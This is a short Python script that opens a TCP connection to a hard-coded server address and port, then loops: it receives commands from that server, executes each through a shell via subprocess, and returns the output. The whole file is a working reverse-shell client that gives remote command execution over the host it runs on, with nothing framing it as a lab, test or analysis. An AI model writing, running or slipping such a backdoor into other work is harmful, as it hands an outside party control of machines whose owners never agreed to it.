import socket
import subprocess

# Connect to the server
server_ip = '10.20.131.38'  # Change to your server's IP address
server_port = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

while True:
    command = client.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    client.send(output.stdout.encode() + output.stderr.encode())

client.close()
